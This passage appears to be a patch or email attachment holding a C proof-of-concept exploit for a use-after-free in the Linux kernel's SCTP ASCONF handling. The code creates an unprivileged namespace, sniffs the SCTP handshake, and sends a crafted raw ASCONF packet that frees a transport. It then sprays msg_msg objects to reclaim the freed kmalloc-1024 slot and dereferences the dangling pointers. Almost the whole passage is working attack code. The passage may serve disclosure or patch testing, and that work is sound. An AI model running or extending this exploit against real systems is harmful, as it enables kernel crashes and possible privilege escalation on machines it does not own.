+#define SCTP_BINDX_ADD   100
+#define SCTP_STATUS_     14
+
+/* ASCONF chunk type and parameter types (network byte order via p16/p32) */
+#define CHUNK_ASCONF     0xC1
+#define PARAM_IPV4       0x0005
+#define PARAM_DEL_IP     0xC002
+
+/* ---- small helpers ---- */
+
+static void die(const char *m)
+{
+	fprintf(stderr, "fatal: %s: %s\n", m, strerror(errno));
+	exit(1);
+}
+
+/* Write a string to a sysctl file. */
+static void wf(const char *path, const char *val)
+{
+	int fd = open(path, O_WRONLY);
+	if (fd < 0) return;
+	write(fd, val, strlen(val));
+	close(fd);
+}
+
+/* CRC32c (Castagnoli) — SCTP checksum. */
+static uint32_t crc32c(const uint8_t *p, size_t n)
+{
+	uint32_t c = 0xFFFFFFFF;
+	for (size_t i = 0; i < n; i++) {
+		c ^= p[i];
+		for (int k = 0; k < 8; k++)
+			c = (c & 1) ? (c >> 1) ^ 0x82F63B78 : (c >> 1);
+	}
+	return ~c;
+}
+
+/* Write a 16/32-bit value in network byte order, advance pointer. */
+static uint8_t *p16(uint8_t *p, uint16_t v) { *(uint16_t *)p = htons(v); return p + 2; }
+static uint8_t *p32(uint8_t *p, uint32_t v) { *(uint32_t *)p = v;          return p + 4; }
+
+/* Wrap an SCTP payload in an IPv4 header (IP_HDRINCL style). */
+static int ip_wrap(uint8_t *b, uint32_t src, uint32_t dst,
+		   const uint8_t *x, int xl)
+{
+	struct iphdr *ip = (void *)b;
+	memset(ip, 0, sizeof *ip);
+	ip->version = 4;
+	ip->ihl     = 5;
+	ip->tot_len = htons(sizeof *ip + xl);
+	ip->ttl     = 64;
+	ip->protocol = IPPROTO_SCTP;
+	ip->saddr   = src;
+	ip->daddr   = dst;
+	memcpy(b + sizeof *ip, x, xl);
+	return sizeof *ip + xl;
+}
+
+/* ---- namespace setup ---- */
+
+static void ns(void)
+{
+	uid_t u = getuid();
+	gid_t g = getgid();
+	char x[64];
+
+	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
+		die("unshare");
+
+	wf("/proc/self/setgroups", "deny");
+	snprintf(x, sizeof x, "0 %d 1", u);  wf("/proc/self/uid_map", x);
+	snprintf(x, sizeof x, "0 %d 1", g);  wf("/proc/self/gid_map", x);
+
+	/* Enable ASCONF (ADD-IP) extension without requiring AUTH. */
+	wf("/proc/sys/net/sctp/addip_enable",       "1");
+	wf("/proc/sys/net/sctp/addip_noauth_enable", "1");
+
+	/* Configure loopback inside the new network namespace. */
+	int s = socket(AF_INET, SOCK_DGRAM, 0);
+	struct ifreq f;
+	memset(&f, 0, sizeof f);
+	strcpy(f.ifr_name, "lo");
+	struct sockaddr_in *si = (void *)&f.ifr_addr;
+	si->sin_family = AF_INET;
+	si->sin_addr.s_addr = LOOP;
+	ioctl(s, SIOCSIFADDR, &f);
+	si->sin_addr.s_addr = htonl(0xff000000);
+	ioctl(s, SIOCSIFNETMASK, &f);
+	f.ifr_flags = 0;
+	ioctl(s, SIOCGIFFLAGS, &f);
+	f.ifr_flags |= IFF_UP | IFF_RUNNING;
+	ioctl(s, SIOCSIFFLAGS, &f);
+	close(s);
+
+	/* Blackhole the spoofed source so the ASCONF-ACK is dropped
+	 * and cannot tear down the association from the remote side.
+	 */
+	setenv("PATH", "/usr/sbin:/usr/bin:/sbin:/bin", 1);
+	if (system("ip route add blackhole 127.0.0.9/32 2>/dev/null")) {}
+}
+
+/* ---- ASCONF chunk crafter ---- */
+/*
+ * Builds a raw SCTP packet containing one ASCONF chunk:
+ *
+ *   [common hdr: src=BPORT dst=VPORT vtag=vt]
+ *   [ASCONF chunk: type=0xC1 serial=serial]
+ *   [Address Param: 127.0.0.3]          ← sets asconf->transport = transport_L
+ *   [DEL-IP 127.0.0.3  (crr_id=1)]      ← frees asconf->transport (unpatched)
+ *   [DEL-IP 0.0.0.0    (crr_id=2)]      ← wildcard: dereferences freed transport
+ *
+ * The CRC32c checksum is computed and stored.
+ */
+static int build_asconf(uint8_t *pk, uint32_t vt, uint32_t serial)
+{
+	uint8_t *p = pk;
+
+	/* SCTP common header (12 bytes) */
+	p = p16(p, BPORT);     /* source port     */
+	p = p16(p, VPORT);     /* dest port       */
+	p = p32(p, vt);        /* verification tag */
+	p = p32(p, 0);         /* checksum (filled last) */
+
+	/* ASCONF chunk header (4 bytes) + serial (4 bytes) */
+	uint8_t *chunk = p;
+	*p++ = CHUNK_ASCONF;   /* chunk type  */
+	*p++ = 0;               /* flags       */
+	p += 2;                 /* length (filled below) */
+	p = p32(p, htonl(serial));
+
+	/* Address Parameter TLV — 127.0.0.3
+	 * This determines asconf->transport (the transport to be freed).
+	 */
+	p = p16(p, PARAM_IPV4);
+	p = p16(p, 8);
+	p = p32(p, htonl(L_IP));
+
+	/* DEL-IP parameter 1 — delete 127.0.0.3
+	 * On unpatched kernels this frees asconf->transport because
+	 * peer == asconf->transport and the guard is absent.
+	 */
+	p = p16(p, PARAM_DEL_IP);
+	p = p16(p, 16);          /* param length: 4 hdr + 4 crr_id + 8 addr */
+	p = p32(p, htonl(1));    /* crr_id */
+	p = p16(p, PARAM_IPV4);
+	p = p16(p, 8);
+	p = p32(p, htonl(L_IP));
+
+	/* DEL-IP parameter 2 — wildcard 0.0.0.0
+	 * Enters the is_any() branch which calls:
+	 *   sctp_assoc_set_primary(asoc, asconf->transport)      ← UAF
+	 *   sctp_assoc_del_nonprimary_peers(asoc, asconf->transport)
+	 * dereferencing the now-freed asconf->transport.
+	 */
+	p = p16(p, PARAM_DEL_IP);
+	p = p16(p, 16);
+	p = p32(p, htonl(2));    /* crr_id */
+	p = p16(p, PARAM_IPV4);
+	p = p16(p, 8);
+	p = p32(p, htonl(0));    /* 0.0.0.0 = wildcard */
+
+	/* Fill in chunk length */
+	*(uint16_t *)(chunk + 2) = htons((uint16_t)(p - chunk));
+
+	/* Compute and store CRC32c over the entire SCTP packet */
+	int len = p - pk;
+	uint32_t crc = crc32c(pk, len);
+	memcpy(pk + 8, &crc, 4);
+	return len;
+}
+
+/* ---- handshake sniffer ---- */
+/*
+ * Sniffs the 4-way SCTP handshake on loopback to extract:
+ *   - vtag:  the server's init-tag (from INIT-ACK), needed in the common header
+ *   - tsn:   the client's initial TSN (from INIT), needed as the ASCONF serial
+ *            (serial must equal asoc->peer.addip_serial + 1 == initial_tsn)
+ */
+static void sniff_handshake(int wfd)
+{
+	int ps = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
+	struct sockaddr_ll ll = {
+		.sll_family   = AF_PACKET,
+		.sll_protocol = htons(ETH_P_IP),
+		.sll_ifindex  = (int)if_nametoindex("lo"),
+	};
+	bind(ps, (void *)&ll, sizeof ll);
+
+	uint32_t vtag = 0, tsn = 0;
+	int got_vtag = 0, got_tsn = 0;
+
+	for (int i = 0; i < 9000 && !(got_vtag && got_tsn); i++) {
+		uint8_t pk[2048];
+		ssize_t n = recv(ps, pk, sizeof pk, 0);
+		if (n < 28) continue;
+		int ih = (pk[0] & 0xf) * 4;          /* IP header length */
+		if (n < ih + 32) continue;
+		uint16_t sp = ntohs(*(uint16_t *)(pk + ih));       /* SCTP src port */
+		uint16_t dp = ntohs(*(uint16_t *)(pk + ih + 2));   /* SCTP dst port */
+		uint8_t  ct = pk[ih + 12];                           /* chunk type   */
+
+		/* INIT (type 1) from client → server: extract initial TSN
+		 * Chunk body starts at ih+12+4; initial_tsn at body+12 = ih+12+16.
+		 */
+		if (sp == BPORT && dp == VPORT && ct == 1) {
+			tsn = ntohl(*(uint32_t *)(pk + ih + 12 + 16));
+			got_tsn = 1;
+		}
+		/* INIT-ACK (type 2) from server → client: extract init tag
+		 * init_tag is the first field of the chunk body = ih+12+4.
+		 */
+		if (sp == VPORT && dp == BPORT && ct == 2) {
+			vtag = *(uint32_t *)(pk + ih + 12 + 4);
+			got_vtag = 1;
+		}
+	}
+
+	uint32_t out[2] = { vtag, tsn };
+	write(wfd, out, sizeof out);
+	_exit(0);
+}
+
+/* ---- client peer ---- */
+/*
+ * Creates the multihomed SCTP association from the client side.
+ * Binds three addresses (127.0.0.1, 127.0.0.2, 127.0.0.3) so the server
+ * sees three peer transports.  After DEL-IP 127.0.0.3, transport_count
+ * drops to 2, allowing the wildcard DEL-IP to proceed (it requires
+ * transport_count > 1 to pass the DEL_LAST_IP check).
+ */
+static void peer_b(struct sockaddr_in vaddr)
+{
+	int one = 1;
+	int b = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
+	if (b < 0) die("peer socket");
+	setsockopt(b, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
+
+	/* Primary bind to 127.0.0.1 */
+	struct sockaddr_in bv = {
+		.sin_family = AF_INET,
+		.sin_port   = htons(BPORT),
+		.sin_addr.s_addr = LOOP,
+	};
+	if (bind(b, (void *)&bv, sizeof bv) < 0) die("peer bind");
+
+	/* Add 127.0.0.2 and 127.0.0.3 as additional bind addresses.
+	 * Together with the primary bind this gives 3 peer transports.
+	 */
+	for (int i = 0; i < 2; i++) {
+		struct sockaddr_in ad = {
+			.sin_family = AF_INET,
+			.sin_port   = htons(BPORT),
+			.sin_addr.s_addr = htonl(0x7f000002 + i),
+		};
+		setsockopt(b, SOL_SCTP_, SCTP_BINDX_ADD, &ad, sizeof ad);
+	}
+
+	usleep(120000);
+	if (connect(b, (void *)&vaddr, sizeof vaddr) < 0)
+		die("connect");
+
+	/* Keep the association alive. */
+	pause();
+}
+
+/* ---- msg_msg spray (kmalloc-1024 reclaim) ---- */
+/*
+ * After the RCU grace period, the freed transport memory is returned to the
+ * slab.  Spraying kmalloc-1024 objects overwrites the freed slot with
+ * controlled data so that subsequent dereferences of the dangling
+ * primary_path/active_path pointer access garbage and fault.
+ */
+#define MSG_DATA 976   /* 48-byte msg_msg header + 976 = 1024 (kmalloc-1024) */
+static int g_msq[64];
+static int g_nmsq = 0;
+
+static void msg_spray(void)
+{
+	struct { long mtype; char mtext[MSG_DATA]; } mb;
+	mb.mtype = 1;
+	memset(mb.mtext, 0x41, sizeof mb.mtext);
+
+	for (int i = 0; i < 64; i++) {
+		int q = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
+		if (q < 0) break;
+		g_msq[g_nmsq++] = q;
+		for (int k = 0; k < 64; k++)
+			if (msgsnd(q, &mb, sizeof mb.mtext, IPC_NOWAIT) != 0)
+				break;
+	}
+}
+
+/* ---- SCTP status struct for getsockopt trigger ---- */
+struct paddrinfo {
+	uint32_t spinfo_assoc_id;
+	uint8_t  spinfo_address[128];
+	int32_t  spinfo_state;
+	uint32_t spinfo_cwnd;
+	uint32_t spinfo_srtt;
+	uint32_t spinfo_rto;
+	uint32_t spinfo_mtu;
+} __attribute__((packed, aligned(4)));
+
+struct sctp_status_ {
+	uint32_t sstat_assoc_id;
+	int32_t  sstat_state;
+	uint32_t sstat_rwnd;
+	uint16_t sstat_unackdata;
+	uint16_t sstat_penddata;
+	uint16_t sstat_instrms;
+	uint16_t sstat_outstrms;
+	uint32_t sstat_fragmentation_point;
+	struct paddrinfo sstat_primary;
+};
+
+/* ---- main ---- */
+int main(void)
+{
+	signal(SIGPIPE, SIG_IGN);
+	setbuf(stdout, NULL);
+
+	/* Pin to CPU 0 so RCU frees land on one per-CPU freelist. */
+	cpu_set_t cs;
+	CPU_ZERO(&cs);
+	CPU_SET(0, &cs);
+	sched_setaffinity(0, sizeof cs, &cs);
+
+	ns();
+	printf("[*] namespace ready\n");
+
+	/* --- server (victim) socket --- */
+	int one = 1;
+	int L = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
+	if (L < 0) die("server socket");
+	setsockopt(L, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
+
+	struct sockaddr_in vaddr = {
+		.sin_family = AF_INET,
+		.sin_port   = htons(VPORT),
+		.sin_addr.s_addr = LOOP,
+	};
+	if (bind(L, (void *)&vaddr, sizeof vaddr) < 0) die("server bind");
+	if (listen(L, 8) < 0) die("listen");
+
+	/* --- fork handshake sniffer --- */
+	int pfd[2];
+	pipe(pfd);
+	if (fork() == 0) { close(pfd[0]); sniff_handshake(pfd[1]); }
+
+	/* --- fork client peer --- */
+	if (fork() == 0) { close(pfd[0]); close(pfd[1]); peer_b(vaddr); }
+	close(pfd[1]);
+
+	/* --- accept the association --- */
+	struct pollfd pf = { .fd = L, .events = POLLIN };
+	if (poll(&pf, 1, 5000) <= 0) { fprintf(stderr, "accept timeout\n"); return 1; }
+	int A = accept(L, NULL, NULL);
+	if (A < 0) die("accept");
+
+	/* --- read vtag and initial_tsn from sniffer --- */
+	uint32_t in[2];
+	if (read(pfd[0], in, sizeof in) != sizeof in) {
+		fprintf(stderr, "sniff failed\n");
+		return 1;
+	}
+	uint32_t vtag = in[0], tsn = in[1];
+	printf("[*] vtag=0x%08x  initial_tsn=0x%08x\n", vtag, tsn);
+
+	/* Let the association stabilise (transports are created during
+	 * the 4-way handshake; accept() returns once it completes).
+	 */
+	usleep(200000);
+	printf("[*] association established with 3 peer transports\n");
+
+	/* --- send the malicious ASCONF --- */
+	printf("[*] sending ASCONF [Addr 127.0.0.3][DEL-IP 127.0.0.3][DEL-IP 0.0.0.0]...\n");
+
+	int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	if (raw < 0) die("raw socket");
+	setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);
+
+	uint8_t sctp[256], ip[400];
+	int sl = build_asconf(sctp, vtag, tsn);
+	int il = ip_wrap(ip, SRCB, LOOP, sctp, sl);
+
+	struct sockaddr_in dst = {
+		.sin_family = AF_INET,
+		.sin_addr.s_addr = LOOP,
+	};
+	if (sendto(raw, ip, il, 0, (void *)&dst, sizeof dst) < 0)
+		die("sendto");
+	close(raw);
+
+	printf("[*] ASCONF sent — UAF triggered on unpatched kernel\n");
+
+	/* --- wait for the RCU grace period so the transport is actually freed --- */
+	/* MEMBARRIER_CMD_SHARED = 1; this blocks until all CPUs have passed a
+	 * grace period, guaranteeing the call_rcu callback (kfree) has run.
+	 */
+	syscall(SYS_membarrier, 1, 0, -1);
+	usleep(100000);
+
+	/* --- reclaim the freed transport memory with controlled data --- */
+	printf("[*] spraying msg_msg (kmalloc-1024) to reclaim freed transport...\n");
+	msg_spray();
+	usleep(50000);
+
+	/* --- trigger dereference of the dangling primary_path / active_path --- */
+	printf("[*] attempting to dereference dangling pointers...\n");
+
+	/* (a) getsockopt SCTP_STATUS — reads primary_path->ipaddr, ->state, etc. */
+	struct sctp_status_ st;
+	memset(&st, 0, sizeof st);
+	socklen_t sl_opt = sizeof st;
+	getsockopt(A, SOL_SCTP_, SCTP_STATUS_, &st, &sl_opt);
+
+	/* (b) send — routes via active_path (dangling) */
+	send(A, "x", 1, MSG_DONTWAIT | MSG_NOSIGNAL);
+
+	/* (c) close — association teardown dereferences primary_path */
+	close(A);
+
+	/* If we reach here the dereference did not fault (e.g. freed memory
+	 * was not yet reclaimed, or KASAN/SLUB debug is off).  The UAF was
+	 * still triggered — the association is corrupted (transport_count == 0,
+	 * primary_path dangling).  A subsequent operation or timer will crash.
+	 */
+	printf("[!] survived immediate dereference — UAF is triggered but\n"
+	       "    the freed slot was not yet reclaimed at the time of access.\n"
+	       "    The association is corrupted; a crash is imminent.\n");
+	sleep(3);
+	return 0;
+}
+
+--jv3lfyjkrnvkybth--
